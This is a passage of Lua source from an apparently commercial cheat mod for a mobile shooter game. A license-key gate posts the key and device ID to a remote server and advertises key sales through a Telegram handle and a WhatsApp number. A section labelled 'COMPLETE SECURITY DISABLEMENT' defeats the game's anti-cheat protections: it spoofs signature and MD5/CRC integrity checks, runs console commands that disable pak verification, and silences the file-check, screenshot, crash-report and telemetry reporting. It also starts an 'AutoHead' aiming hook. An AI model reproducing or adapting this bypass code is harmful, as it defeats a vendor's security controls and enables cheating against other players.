        if PlayerMapMarker and PlayerMapMarker.GetMyPlayerController then PC = PlayerMapMarker.GetMyPlayerController() end
        if PC and PC.GetViewportSize then
            local VS = V2(0, 0)
            PC:GetViewportSize(VS)
            if VS and VS.X and VS.Y and VS.X > 200 and VS.Y > 200 then
                ViewW, ViewH = VS.X, VS.Y
            end
        end
    end)

    local DialogW, DialogH = 560, 300
    local DialogX = math.max(0, (ViewW - DialogW) * 0.5)
    local DialogY = math.max(0, (ViewH - DialogH) * 0.5)

    local Root = nil
    pcall(function() Root = CGame:NewObjectFromPath("/Script/UMG.CanvasPanel", Parent) end)
    if not Root or not slua.isValid(Root) then
        _L.InputBusy = false
        _L.ShowPopup("LICENSE ERROR", "Unable to create license input UI.")
        return
    end

    local function centerSlot(widget, size, offsetX, offsetY, z)
        if not widget then return nil end
        local slot = Parent:AddChildToCanvas(widget)
        if not slot then return nil end

        local localPos = nil

        pcall(function()
            local SBL = SlateBlueprintLibrary
            local cg = Parent:GetCachedGeometry()
            if SBL and SBL.AbsoluteToLocal and cg then
                local screenCenter = V2(ViewW * 0.5, ViewH * 0.5)
                local topLeftAbs = V2(
                    screenCenter.X - (size.X * 0.5) + (offsetX or 0) - 310,
                    screenCenter.Y - (size.Y * 0.5) + (offsetY or 0) - 225
                )
                localPos = SBL.AbsoluteToLocal(cg, topLeftAbs)
            end
        end)

        if not localPos then
            pcall(function()
                local WLL = WidgetLayoutLibrary
                local cg = Parent:GetCachedGeometry()
                if WLL and WLL.ScreenToWidgetLocal and cg then
                    local screenCenter = V2(ViewW * 0.5, ViewH * 0.5)
                    local topLeftAbs = V2(
                        screenCenter.X - (size.X * 0.5) + (offsetX or 0),
                        screenCenter.Y - (size.Y * 0.5) + (offsetY or 0)
                    )
                    local outPos = V2(0, 0)
                    WLL.ScreenToWidgetLocal(
                        PlayerMapMarker.GetMyPlayerController(),
                        cg,
                        topLeftAbs,
                        outPos
                    )
                    localPos = outPos
                end
            end)
        end

        if not localPos then
            localPos = V2(
                (ViewW - size.X) * 0.5 + (offsetX or 0) - 310,
                (ViewH - size.Y) * 0.5 + (offsetY or 0) - 225
            )
        end

        pcall(function()
            if slot.SetPosition then slot:SetPosition(localPos) end
            if slot.SetSize then slot:SetSize(size) end
            if slot.SetAlignment then slot:SetAlignment(V2(0, 0)) end
            if slot.SetZOrder then slot:SetZOrder(z or 99991) end
        end)

        return slot
    end

    local Dim = nil
    pcall(function() Dim = CGame:NewObjectFromPath("/Script/UMG.Border", Parent) end)
    if Dim and slua.isValid(Dim) then
        _L.InputWidgets[#_L.InputWidgets + 1] = Dim
        pcall(function()
            Dim:SetBrushColor(LC(0, 0, 0, 0.62))
            Dim:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible)
        end)
        local ds = Parent:AddChildToCanvas(Dim)
        pcall(function()
            local A = import("Anchors") or import("/Script/SlateCore.Anchors")
            if A and ds and ds.SetAnchors then ds:SetAnchors(A(0,0,1,1)) end
            if ds and ds.SetZOrder then ds:SetZOrder(99990) end
        end)
    end

    local DialogW, DialogH = 560, 300

    local Panel = nil
    pcall(function() Panel = CGame:NewObjectFromPath("/Script/UMG.Border", Parent) end)
    if not Panel or not slua.isValid(Panel) then
        _L.CloseInput()
        _L.ShowPopup("LICENSE ERROR", "Unable to create license dialog.")
        return
    end
    _L.InputWidgets[#_L.InputWidgets + 1] = Panel
    pcall(function()
        Panel:SetBrushColor(LC(0.015, 0.015, 0.02, 0.97))
        Panel:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible)
    end)
    centerSlot(Panel, V2(DialogW,DialogH), 0, 0, 99991)

    local Header = nil
    pcall(function() Header = CGame:NewObjectFromPath("/Script/UMG.Border", Parent) end)
    if Header and slua.isValid(Header) then
        _L.InputWidgets[#_L.InputWidgets + 1] = Header
        pcall(function() Header:SetBrushColor(LC(0.025,0.025,0.03,1.0)) end)
        centerSlot(Header, V2(DialogW,54), 0, -DialogH*0.5 + 27, 99992)
    end

    local Accent = nil
    pcall(function() Accent = CGame:NewObjectFromPath("/Script/UMG.Border", Parent) end)
    if Accent and slua.isValid(Accent) then
        _L.InputWidgets[#_L.InputWidgets + 1] = Accent
        pcall(function() Accent:SetBrushColor(LC(0.10,0.85,0.65,1.0)) end)
        centerSlot(Accent, V2(6,54), -DialogW*0.5 + 3, -DialogH*0.5 + 27, 99993)
    end

    local Title = nil
    pcall(function() Title = CGame:NewObjectFromPath("/Script/UMG.TextBlock", Parent) end)
    if Title and slua.isValid(Title) then
        _L.InputWidgets[#_L.InputWidgets + 1] = Title
        pcall(function()
            Title:SetText("ENTER KEY * BUY KEY @SHAYAN_TOOL1")
            local c = LC(0.20,1.0,0.72,1.0)
            if SC then Title:SetColorAndOpacity(SC(c)) else Title:SetColorAndOpacity(c) end
            if Title.Font then local f=Title.Font; f.Size=20; Title.Font=f end
        end)
        centerSlot(Title, V2(480,40), -DialogW*0.5 + 265, -DialogH*0.5 + 27, 99994)
    end

    local Close = nil
    pcall(function() Close = CGame:NewObjectFromPath("/Script/UMG.Button", Parent) end)
    if Close and slua.isValid(Close) then
        _L.InputWidgets[#_L.InputWidgets + 1] = Close
        pcall(function() Close:SetColorAndOpacity(LC(0.08,0.55,0.40,1.0)) end)
        local xt = nil
        pcall(function() xt = CGame:NewObjectFromPath("/Script/UMG.TextBlock", Close) end)
        if xt and slua.isValid(xt) then
            _L.InputWidgets[#_L.InputWidgets + 1] = xt
            pcall(function()
                xt:SetText("X")
                if xt.Font then local f=xt.Font; f.Size=24; xt.Font=f end
            end)
            pcall(function() Close:AddChild(xt) end)
        end
        centerSlot(Close, V2(45,54), DialogW*0.5 - 22.5, -DialogH*0.5 + 27, 99995)
        -- Login must remain on screen until a server-valid key is entered.
        -- The close button is intentionally non-cancelling.
        _L.AddClick(Close, function()
            pcall(function() if Box and Box.SetKeyboardFocus then Box:SetKeyboardFocus() end end)
        end)
        _L.AddPress(Close, function()
            pcall(function() if Box and Box.SetKeyboardFocus then Box:SetKeyboardFocus() end end)
        end)
    end

    local Box = nil
    pcall(function() Box = CGame:NewObjectFromPath("/Script/UMG.EditableTextBox", Parent) end)
    if not Box or not slua.isValid(Box) then
        _L.CloseInput()
        _L.ShowPopup("LICENSE ERROR", "This game build does not expose UMG EditableTextBox to Lua.")
        return
    end
    _L.InputWidgets[#_L.InputWidgets + 1] = Box
    pcall(function()
        if Box.SetHintText then Box:SetHintText("Tap to type.") end
        if Box.SetIsReadOnly then Box:SetIsReadOnly(false) end
        if Box.SetIsPassword then Box:SetIsPassword(false) end
        if Box.SetText then Box:SetText(_L.CachedKey or "") end
         if Box.SetBackgroundColor then Box:SetBackgroundColor(LC(0.035,0.035,0.045,0.98)) end
         if Box.SetForegroundColor then Box:SetForegroundColor(LC(1.0,1.0,1.0,1.0)) end
    end)
    centerSlot(Box, V2(380,55), 0, -DialogH*0.5 + 142.5, 99996)
    _L.InputBox = Box

    local Btn = nil
    pcall(function() Btn = CGame:NewObjectFromPath("/Script/UMG.Button", Parent) end)
    if not Btn or not slua.isValid(Btn) then
        _L.CloseInput()
        _L.ShowPopup("LICENSE ERROR", "Unable to create OK button.")
        return
    end
    _L.InputWidgets[#_L.InputWidgets + 1] = Btn
    pcall(function()
        if Btn.SetColorAndOpacity then Btn:SetColorAndOpacity(LC(0.08,0.65,0.46,1.0)) end
    end)
    local Bt = nil
    pcall(function() Bt = CGame:NewObjectFromPath("/Script/UMG.TextBlock", Parent) end)
    if Bt and slua.isValid(Bt) then
        _L.InputWidgets[#_L.InputWidgets + 1] = Bt
        pcall(function()
            Bt:SetText("OK")
            if Bt.Font then local f=Bt.Font; f.Size=20; Bt.Font=f end
        end)
        pcall(function() Btn:AddChild(Bt) end)
    end
    centerSlot(Btn, V2(160,58), 0, DialogH*0.5 - 40, 99997)
    _L.InputButton = Btn

    _L.InputSubmitLocked = false
    _L.AddClick(Btn, function()
        if _L.InputSubmitLocked == true or _G.LicenseChecking == true then return end
        _L.InputSubmitLocked = true
        _G.LicenseSessionCancelled = false
        local key = _L.GetText(Box)
        if key == "" then
            _L.InputSubmitLocked = false
            _L.ShowPopup("LICENSE ERROR", "No license key entered")
            pcall(function() if Box.SetKeyboardFocus then Box:SetKeyboardFocus() end end)
            return
        end
        _L.CachedKey = key
        _G.__SHD_LICENSE_KEY = key
        _L.InputBusy = false
        if callback then callback(key, false) end
    end)

    _L.InputRoot = Panel
    pcall(function()
        if Box.SetKeyboardFocus then Box:SetKeyboardFocus() end
    end)
    return true
end

_L.GetHWID = function()
    local hwid = nil
    pcall(function()
        local Kismet = import('/Script/Engine.KismetSystemLibrary')
        if Kismet and Kismet.GetDeviceId then
            local v = Kismet.GetDeviceId()
            if v and tostring(v) ~= "" then hwid = tostring(v) end
        end
    end)
    if not hwid then
        pcall(function()
            local SystemLib = import("KismetSystemLibrary")
            if SystemLib and SystemLib.GetDeviceId then
                local v = SystemLib.GetDeviceId()
                if v and tostring(v) ~= "" then hwid = tostring(v) end
            end
        end)
    end
    return hwid or "UNKNOWN"
end

_L.UrlEncode = function(value)
    value = tostring(value or "")
    value = value:gsub("\n", "\r\n")
    return value:gsub("([^%w%-%._~])", function(c)
        return string.format("%%%02X", string.byte(c))
    end)
end

_L.JsonString = function(resp, field)
    return string.match(resp, '"' .. field .. '"%s*:%s*"([^"]*)"')
end

_L.JsonNumber = function(resp, field)
    local value = string.match(resp, '"' .. field .. '"%s*:%s*(-?%d+%.?%d*)')
    return value and tonumber(value) or nil
end

_L.GetReason = function(resp)
    return _L.JsonString(resp, "reason")
        or _L.JsonString(resp, "message")
        or _L.JsonString(resp, "msg")
        or "Validation Failed"
end

-- Convert common server expiry formats into a Unix timestamp.
_L.ParseExpiry = function(value)
    if value == nil then return nil end
    local s = tostring(value):gsub("^%s+", ""):gsub("%s+$", "")
    if s == "" then return nil end

    local n = tonumber(s)
    if n and n > 100000000 then
        return n
    end

    local y,mo,d,h,mi,se = s:match("^(%d%d%d%d)%-(%d%d)%-(%d%d)[ T](%d%d):(%d%d):(%d%d)")
    if not y then y,mo,d = s:match("^(%d%d%d%d)%-(%d%d)%-(%d%d)$") end
    if y then
        local ok, ts = pcall(os.time, {
            year=tonumber(y), month=tonumber(mo), day=tonumber(d),
            hour=tonumber(h) or 23, min=tonumber(mi) or 59, sec=tonumber(se) or 59
        })
        if ok and ts then return ts end
    end

    local dmy, mmy, ymy = s:match("^(%d%d)[/%-](%d%d)[/%-](%d%d%d%d)$")
    if dmy then
        local ok, ts = pcall(os.time, {
            year=tonumber(ymy), month=tonumber(mmy), day=tonumber(dmy),
            hour=23, min=59, sec=59
        })
        if ok and ts then return ts end
    end

    return nil
end

_G.License_GetExpiryTimestamp = function()
    return _L.ParseExpiry(_G.LicenseEXP)
        or _L.ParseExpiry(_G.LicenseExpiredDate)
end

_G.IsLicenseOK = function()
    return _G.LicenseValid == true
        and _G.ModsEnabled == true
        and _G.ModMenuUnlocked == true
        and _G.ModFeaturesEnabled == true
end

_G.DisableModAccess = function(reason, showPopup)
    _G.LicenseValid = false
    _G.ModsEnabled = false
    _G.ModMenuUnlocked = false
    _G.ModFeaturesEnabled = false
    _G.LicenseForceValidate = false

    -- Turn every boolean feature switch off without disturbing numeric settings.
    pcall(function()
        if _G.LexusConfig then
            for k,v in pairs(_G.LexusConfig) do
                if type(v) == "boolean" then
                    _G.LexusConfig[k] = false
                end
            end
        end
        if _G.PUT_SaveConfig then _G.PUT_SaveConfig() end
    end)

    -- Prevent the basic popup menu from reopening.
    _G.PUTBasic = _G.PUTBasic or {}
    _G.PUTBasic.locked = true

    if showPopup then
        pcall(function()
            _L.ShowPopup("KEY EXPIRED", tostring(reason or "Your key is no longer valid.") ..
                "\nEnter a new valid key to enable the mod again.")
        end)
    end
end

_G.EnableModAccess = function()
    _G.ModMenuUnlocked = true
    _G.ModFeaturesEnabled = true
    _G.ModsEnabled = true
    _G.PUTBasic = _G.PUTBasic or {}
    _G.PUTBasic.locked = false
end

_G.RemoveRegisteredModMenu = function()
    -- Remove the custom settings page from currently held catalogs.
    pcall(function()
        local SettingPageDefine = require("client.logic.NewSetting.SettingPageDefine")
        local SettingCatalog = require("client.logic.NewSetting.SettingCatalog")
        if type(SettingCatalog) == "table" then
            for i = #SettingCatalog, 1, -1 do
                local page = SettingCatalog[i]
                if type(page) == "table" and page.Key == "MyModMenu" then
                    table.remove(SettingCatalog, i)
                end
            end
        end
        if type(SettingPageDefine) == "table" then
            SettingPageDefine.MyModMenu = nil
        end
    end)
end

_G.License_ShowLockedKeyInput = function()
    if _L.InputBusy == true then return end
    _L.ShowKeyInput(function(key, cancelled)
        if cancelled or not key or tostring(key) == "" then
            return
        end
        _L.CachedKey = tostring(key):gsub("^%s+", ""):gsub("%s+$", ""):gsub("[%r%n%s]+", "")
        _G.__SHD_LICENSE_KEY = _L.CachedKey
        _G.LicenseSessionKeyConfirmed = true
        _G.LicenseValid = false
        _G.ModsEnabled = false
        _G.ModMenuUnlocked = false
        _G.ModFeaturesEnabled = false
        _G.License_Validate(function() end)
    end)
end


_G.License_Validate = function(callback)
    if _G.LicenseSessionCancelled == true then
        _G.LicenseValid = false
        _G.ModsEnabled = false
        if callback then callback(false) end
        return
    end

    -- Persistent login: if a key was previously saved, validate it directly
    -- against the server. The login UI is shown only when there is no saved key
    -- or when the server rejects the saved key.
    if _G.LicenseSessionKeyConfirmed ~= true then
        local savedKey = _L.CachedKey or _G.__SHD_LICENSE_KEY or ""
        savedKey = tostring(savedKey):gsub("^%s+", ""):gsub("%s+$", "")
        savedKey = savedKey:gsub("[%r%n%s]+", "")

        if savedKey ~= "" then
            _L.CachedKey = savedKey
            _G.__SHD_LICENSE_KEY = savedKey
            _G.LicenseSessionKeyConfirmed = true
        else
            if _G.LicenseChecking == true or _L.InputBusy == true then return end
            _L.ShowKeyInput(function(key, cancelled)
                if cancelled or not key or tostring(key) == "" then
                    _G.LicenseSessionKeyConfirmed = false
                    if callback then callback(false) end
                    return
                end
                _L.CachedKey = tostring(key):gsub("^%s+", ""):gsub("%s+$", ""):gsub("[%r%n%s]+", "")
                _G.__SHD_LICENSE_KEY = _L.CachedKey
                _G.LicenseSessionKeyConfirmed = true
                _G.License_Validate(callback)
            end)
            return
        end
    end

    if _G.LicenseValid == true and _G.LicenseForceValidate ~= true then
        if callback then callback(true) end
        return
    end
    _G.LicenseForceValidate = false
    if _G.LicenseChecking == true or _L.InputBusy == true then return end

    local userKey = _L.CachedKey or _G.__SHD_LICENSE_KEY or ""
    userKey = tostring(userKey):gsub("^%s+", ""):gsub("%s+$", "")
    userKey = userKey:gsub("[%r%n%s]+", "")

    if userKey == "" then
        _G.LicenseSessionKeyConfirmed = false
        _L.ShowKeyInput(function(key, cancelled)
            if cancelled or not key then
                if callback then callback(false) end
                return
            end
            _L.CachedKey = key
            _G.__SHD_LICENSE_KEY = key
            _G.LicenseSessionKeyConfirmed = true
            _G.License_Validate(callback)
        end)
        return
    end

    local userHWID = _L.GetHWID()
    if not userHWID or userHWID == "" then userHWID = "UNKNOWN" end

    local ok, http = pcall(function()
        return ModuleManager.GetModule(ModuleManager.CommonModuleConfig.http_manager)
    end)
    if not ok or not http or not http.Post then
        _L.ShowPopup("LICENSE ERROR", "HTTP manager not available")
        if callback then callback(false) end
        return
    end

    local c_rng = tostring(os.time(os.date("!*t")))
    local postData = "game=" .. _L.UrlEncode(_L.LICENSE_GAMES)
        .. "&user_key=" .. _L.UrlEncode(userKey)
        .. "&serial=" .. _L.UrlEncode(userHWID)
        .. "&verrr=" .. _L.UrlEncode(_L.APP_VERSION)
        .. "&c_rng=" .. _L.UrlEncode(c_rng)

    local headers = {
        ["Content-Type"] = "application/x-www-form-urlencoded",
        ["Accept"] = "application/json",
        ContentType = "application/x-www-form-urlencoded",
        contentType = "application/x-www-form-urlencoded"
    }

    _G.LicenseChecking = true

    local function extractStr(x)
        if x == nil then return nil end
        if type(x) == "string" and #x > 2 then return x end
        if type(x) == "number" then return nil end
        if type(x) == "table" then
            if type(x.body) == "string" and #x.body > 2 then return x.body end
            if type(x.Body) == "string" and #x.Body > 2 then return x.Body end
            if type(x.Content) == "string" and #x.Content > 2 then return x.Content end
            if type(x.content) == "string" and #x.content > 2 then return x.content end
            if type(x.data) == "string" and #x.data > 2 then return x.data end
            local okEnc, j = pcall(function()
                local cjson = require("cjson")
                return cjson.encode(x)
            end)
            if okEnc and j and #j > 2 then return j end
        end
        return nil
    end

    local function getResponse(a, b)
        local sa = extractStr(a)
        local sb = extractStr(b)
        local function looksJson(s)
            if not s then return false end
            if string.find(s, "{", 1, true) then return true end
            return false
        end
        if looksJson(sa) then return sa end
        if looksJson(sb) then return sb end
        return sa or sb or ""
    end

    local postOk, postErr = pcall(function()
        http:Post(_L.API_URL, headers, postData, nil, function(a, b)
            _G.LicenseChecking = false

            local response = getResponse(a, b)
            response = tostring(response or "")
            response = response:gsub("^%s+", ""):gsub("%s+$", "")

            print("[LICENSE DEBUG] Response length: " .. tostring(#response))
            if #response > 0 and #response < 600 then
                print("[LICENSE DEBUG] Response: " .. response)
            end

            local validated = false
            local errorMessage = "Bad Server Response"

            if response ~= "" and string.find(response, "{", 1, true) then
                local parsed = nil
                pcall(function()
                    local cjson = require("cjson")
                    parsed = cjson.decode(response)
                end)

                local status_val = nil
                local data_obj = nil

                if parsed then
                    status_val = parsed.status
                    if status_val == nil then status_val = parsed.success end
                    data_obj = parsed.data or parsed
                end

                if status_val == nil then
                    if string.find(response, '"status"%s*:%s*true') then
                        status_val = true
                    elseif string.find(response, '"success"%s*:%s*true') then
                        status_val = true
                    else
                        status_val = false
                    end
                end

                if status_val == true then
                    local token, exp, rng, modname, modStatus, credit, expiredDate, enc
                    if data_obj and type(data_obj) == "table" then
                        token       = data_obj.token
                        exp         = data_obj.EXP or data_obj.exp or data_obj.expiry
                        rng         = data_obj.rng
                        modname     = data_obj.modname or data_obj.mod_name
                        modStatus   = data_obj.mod_status or data_obj.status_text
                        credit      = data_obj.credit
                        expiredDate = data_obj.expired_date or data_obj.expiry_date
                        enc         = data_obj.Enc or data_obj.enc
                    end
                    if not token then token = _L.JsonString(response, "token") end
                    if not exp then exp = _L.JsonString(response, "EXP") end
                    if not rng then rng = _L.JsonNumber(response, "rng") end
                    if not modname then modname = _L.JsonString(response, "modname") end
                    if not modStatus then modStatus = _L.JsonString(response, "mod_status") end
                    if not credit then credit = _L.JsonString(response, "credit") end
                    if not expiredDate then expiredDate = _L.JsonString(response, "expired_date") end
                    if not enc then enc = _L.JsonString(response, "Enc") end

                    if exp then _G.LicenseEXP = exp end
                    if rng then _G.LicenseRng = rng end
                    if token then _G.LicenseToken = token end
                    if modname then _G.LicenseModName = modname end
                    if modStatus then _G.LicenseModStatus = modStatus end
                    if credit then _G.LicenseCredit = credit end
                    if expiredDate then _G.LicenseExpiredDate = expiredDate end
                    if enc then _G.LicenseEnc = enc end
                    validated = true
                else
                    if parsed and type(parsed) == "table" then
                        errorMessage = parsed.reason or parsed.message or parsed.msg
                            or _L.GetReason(response)
                    else
                        errorMessage = _L.GetReason(response)
                    end
                end
            elseif response == "" then
                errorMessage = "Empty Server Response - Check internet"
            else
                errorMessage = "Server Error: " .. tostring(response):sub(1, 80)
            end

            if validated then
                _G.LicenseValid = true
                _G.ModsEnabled = true
                _G.LicenseSessionKeyConfirmed = true
                _L.CloseInput()
                _L.SaveKey(userKey)
                _G.EnableModAccess()
                print("[LICENSE] VALID - Mods enabled")
                pcall(function()
                    if _G.__AegisStartAfterLicense then
                        _G.__AegisStartAfterLicense()
                    end
                end)
                if callback then callback(true) end
            else
                _G.LicenseValid = false
                _G.ModsEnabled = false
                _G.LicenseSessionKeyConfirmed = false
                _G.ModMenuUnlocked = false
                _G.ModFeaturesEnabled = false
                _L.InputBusy = false
                pcall(function() _G.RemoveRegisteredModMenu() end)
                _L.InputSubmitLocked = false

                -- IMPORTANT: A rejected key must NEVER dismiss the login gate.
                -- Keep the license screen active until the server returns status=true.
                -- Do not save the rejected key.
                _L.CachedKey = ""
                _G.__SHD_LICENSE_KEY = ""
                _L.ShowPopup("LICENSE ERROR", tostring(errorMessage) .. "\nPlease enter a valid key.Contact Owner to buy:\nWhatsApp: +92 [ 03319741588 ] \nTelegram: @SHAYAN_TOOL1")

                pcall(function()
                    if _L.InputRoot and slua.isValid(_L.InputRoot) then
                        if _L.InputRoot.SetVisibility then
                            _L.InputRoot:SetVisibility(UEnums.ESlateVisibility.Visible)
                        end
                        if _L.InputBox and _L.InputBox.SetText then
                            _L.InputBox:SetText("")
                        end
                        if _L.InputBox and _L.InputBox.SetKeyboardFocus then
                            _L.InputBox:SetKeyboardFocus()
                        end
                    else
                        -- Recreate the login UI if the game removed the old widget.
                        _L.InputBusy = false
                        _L.ShowKeyInput(function(key, cancelled)
                            if cancelled or not key or tostring(key) == "" then
                                _G.LicenseSessionKeyConfirmed = false
                                return
                            end
                            _L.CachedKey = tostring(key):gsub("^%s+", ""):gsub("%s+$", ""):gsub("[%r%n%s]+", "")
                            _G.__SHD_LICENSE_KEY = _L.CachedKey
                            _G.LicenseSessionKeyConfirmed = true
                            _G.License_Validate(callback)
                        end)
                    end
                end)
                print("[LICENSE] INVALID - " .. tostring(errorMessage) .. " - login remains locked")
                if callback then callback(false) end
            end
        end, 30)
    end)

    if not postOk then
        _G.LicenseChecking = false
        _L.InputBusy = false
        _L.InputSubmitLocked = false
        _L.ShowPopup("LICENSE ERROR", "Network exception - check internet")
        print("[LICENSE] Exception: " .. tostring(postErr))
        if callback then callback(false) end
    end
end

_G.License_ReadKey = function() return _L.CachedKey or "" end
_G.License_GetHWID = _L.GetHWID
_G.License_API_URL = _L.API_URL

-- Timer helper used by license side
local tick_license = nil
pcall(function() tick_license = require("common.time_ticker") end)
local function LaterLicense(seconds, fn, allowSync)
  if tick_license and tick_license.AddTimerOnce then
    tick_license.AddTimerOnce(seconds, fn)
  elseif allowSync then
    fn()
  end
end

-- Strict license watchdog:
--  * keeps the menu hidden while key is missing/invalid
--  * turns all feature switches off when the server-reported expiry is reached
--  * periodically asks the server to revalidate the active key
do
    local watchdogToken = _G.LicenseWatchdogToken
    local lastServerCheck = 0

    local function LicenseWatchdog()
        if watchdogToken ~= _G.LicenseWatchdogToken then return end

        local now = os.time()
        local expiryTs = _G.License_GetExpiryTimestamp and _G.License_GetExpiryTimestamp() or nil

        if _G.LicenseValid == true and expiryTs and now >= expiryTs then
            _G.DisableModAccess("Your license key has expired.", true)
            pcall(function() _G.RemoveRegisteredModMenu() end)
            _G.LicenseSessionKeyConfirmed = false
            _G.LicenseForceValidate = false
            pcall(function() _G.License_ShowLockedKeyInput() end)
        elseif _G.LicenseValid == true and (_G.LicenseSessionKeyConfirmed == true) then
            if now - lastServerCheck >= 60 then
                lastServerCheck = now
                _G.LicenseForceValidate = true
                pcall(function()
                    _G.License_Validate(function(ok)
                        if not ok then
                            _G.DisableModAccess("License validation failed.", false)
                            pcall(function() _G.RemoveRegisteredModMenu() end)
                        end
                    end)
                end)
            end
        else
            -- Locked state: make sure stale menu pages stay removed.
            _G.ModMenuUnlocked = false
            _G.ModFeaturesEnabled = false
        end

        local okTicker, ticker = pcall(require, "common.time_ticker")
        if okTicker and ticker and ticker.AddTimerOnce then
            ticker.AddTimerOnce(1.0, LicenseWatchdog)
        end
    end

    local okTicker, ticker = pcall(require, "common.time_ticker")
    if okTicker and ticker and ticker.AddTimerOnce then
        ticker.AddTimerOnce(0.8, LicenseWatchdog)
    end
end

-- Trigger license validation on startup
pcall(function()
    LaterLicense(0.25, function()
        if _G.License_Validate and _G.LicenseSessionCancelled ~= true then
            _G.License_Validate(function(ok)
                if ok then
                    print("[License] Server validated OK - mods enabled")
                else
                    print("[License] Server validation failed - mods gated")
                end
            end)
        end
    end, true)
end)

-- Bridge: when license validates, trigger main bypass (main.lua's equivalent)
_G.__AegisStartAfterLicense = function()
  if not (_G.IsLicenseOK and _G.IsLicenseOK()) then return end
  pcall(function()
    local delay = math.random(120, 300) / 1000
    LaterLicense(delay, function()
      if not (_G.IsLicenseOK and _G.IsLicenseOK()) then return end

      -- Unlock/register the menu only after the server says the key is valid.
      pcall(function()
        if _G.InitModMenuTab then _G.InitModMenuTab() end
      end)

      -- Start the existing mod systems only after key validation.
      pcall(function()
        if _G.InitAllModSystems then _G.InitAllModSystems() end
      end)

      pcall(function()
        if _G.StartBypass_VIP_v3 then _G.StartBypass_VIP_v3() end
        if _G.InitializeAutoHeadHooks then _G.InitializeAutoHeadHooks() end
      end)
    end, true)
  end)
end

-- ==============================================================================
-- ================== INITIALIZATION AND FIRST BYPASS LOAD ==========================
-- ==============================================================================

-- ============================================================================
-- ULTIMATE MERGED BYPASS v3.0 - COMPLETE SECURITY DISABLEMENT
-- ============================================================================
local function nop() return true end
local function retFalse() return false end
local function retZero() return 0 end
local function retEmpty() return {} end
local function retNil() return nil end
local function retTrue() return true end
local function retEmptyString() return "" end
local CONFIG = { ENABLED = 1 }
local function empty_func() end
local function empty_table() return {} end
local function zero_func() return 0 end
local function true_func() return true end
local function false_func() return false end

local function InitializeSLUABypass()
    pcall(function()
        if slua and slua.getSignature then slua.getSignature = function() return 0xDEADBEEF end end
        local loader = package.loaded["slua.loader"] or rawget(_G, "slua_loader")
        if loader then
            loader.verifyBytecode = retTrue
            loader.checkIntegrity = retTrue
            if loader.disableSignatureCheck then loader.disableSignatureCheck = retTrue end
        end
        local slua_serialize = package.loaded["slua.serialize"]
        if slua_serialize then
            slua_serialize.check = retTrue
            slua_serialize.verify = retTrue
        end
        if jit and jit.attach then jit.attach(function() end, "bc") end
        if _G.slua_verify then _G.slua_verify = retTrue end
        if _G.check_slua_integrity then _G.check_slua_integrity = retTrue end
    end)
end

local function InitializeMD5Bypass()
    pcall(function()
        local console = import("KismetSystemLibrary")
        if console then
            console.ExecuteConsoleCommand(nil, "pak.DisablePakSignatureCheck 1")
            console.ExecuteConsoleCommand(nil, "pakchunk.EnableSignatureCheck 0")
            console.ExecuteConsoleCommand(nil, "s.VerifyPak 0")
            console.ExecuteConsoleCommand(nil, "sig.Check 0")
            console.ExecuteConsoleCommand(nil, "security.DisableChecks 1")
        end
        local CMode = import("CreativeModeBlueprintLibrary")
        if CMode then
            CMode.MD5HashByteArray = function() return "00000000000000000000000000000000" end
            CMode.MD5HashFile = function() return "00000000000000000000000000000000" end
            CMode.GetContentDiffData = function() return true, "BYPASSED" end
            CMode.VerifyFileIntegrity = retTrue
        end
        if _G.MD5Hash then _G.MD5Hash = function() return "00000000000000000000000000000000" end end
        if _G.CRC32 then _G.CRC32 = function() return 0 end end
        if _G.SHA1 then _G.SHA1 = function() return "BYPASS" end end
        local FileHashChecker = package.loaded["common.file_hash_checker"]
        if FileHashChecker then
            FileHashChecker.CheckFileMD5 = retTrue
            FileHashChecker.VerifyAll = retTrue
            FileHashChecker.GetHash = function() return "BYPASS" end
        end
        local TssSdk = package.loaded["TssSdk"] or _G.TssSdk
        if TssSdk then
            TssSdk.GetFileMD5 = function() return "BYPASS" end
            TssSdk.VerifyFileSignature = retTrue
        end
        local STExtra = import("STExtraBlueprintFunctionLibrary")
        if STExtra then
            STExtra.CheckMD5 = retTrue
            STExtra.GetMD5 = function() return "BYPASS" end
            STExtra.VerifyFile = retTrue
        end
    end)
end
local function InitializeSkinBypass()
    pcall(function()
        local ptlog = package.loaded["client.slua.logic.download.report.puffer_tlog"]
        if ptlog then
            ptlog.ReportEvent = nop
            ptlog.ReportDownloadResult = nop
            ptlog.ReportODPTDError = nop
            ptlog.ReportSkinError = nop
        end
        local AvatarUtils = package.loaded["AvatarUtils"]
        if AvatarUtils then
            AvatarUtils.CheckIsWeaponInBlackList = retFalse
            AvatarUtils.IsValidAvatar = retTrue
            AvatarUtils.CheckAvatarIntegrity = retTrue
            AvatarUtils.ReportInvalidAvatar = nop
        end
        local sub = require("GameLua.GameCore.Module.Subsystem.SubsystemMgr"):Get("FileCheckSubsystem")
        if sub then
            sub.StartCheck = nop
            sub.ReportAbnormalFile = nop
            sub.StopCheck = nop
        end
        local eqEx = package.loaded["client.slua.logic.report.EquipmentExceptionReport"]
        if eqEx then
            eqEx.Report = nop
            eqEx.SendException = nop
        end
    end)
end
local function InitializeLogBlocker()
    pcall(function()
        local SMTD = import("ScreenshotMTDer")
        if SMTD then
            SMTD.MTDePicture = function() return "" end
            SMTD.ReMTDePicture = function() return "" end
            SMTD.HasCaptured = retTrue
            SMTD.TakeScreenshot = nop
        end
        local TLog = package.loaded["TLog"] or _G.TLog
        if TLog then
            TLog.Info = nop
            TLog.Warning = nop
            TLog.Error = nop
            TLog.Debug = nop
            TLog.Report = nop
            TLog.Send = nop
            TLog.Flush = nop
        end
        local CrashSight = package.loaded["CrashSight"] or _G.CrashSight
        if CrashSight then
            CrashSight.ReportException = nop
            CrashSight.SetCustomData = nop
            CrashSight.Log = nop
            CrashSight.SendCrash = nop
            CrashSight.ReportUserException = nop
        end
        local GRUtils = package.loaded["GameLua.Mod.BaseMod.GamePlay.GameReport.GameReportUtils"]
        if GRUtils then
            GRUtils.BugglyPostExceptionFull = retFalse
            GRUtils.CheckCanBugglyPostException = retFalse
            GRUtils.ReplayReportData = nop
            GRUtils.ReportGameException = nop
            GRUtils.PostException = nop
        end
        local CTR = package.loaded["client.slua.logic.report.ClientToolsReport"]
        if CTR then
            CTR.SendReport = nop
            CTR.SendException = nop
            CTR.UploadLog = nop
        end
        for _, sdk in ipairs({ "Firebase", "Adjust", "AppsFlyer", "FacebookAnalytics", "GameAnalytics" }) do
            local s = _G[sdk]
            if s then
                s.logEvent = nop
                s.trackEvent = nop
                s.setEnabled = retFalse
                s.sendEvent = nop
                s.report = nop
            end
        end
    end)
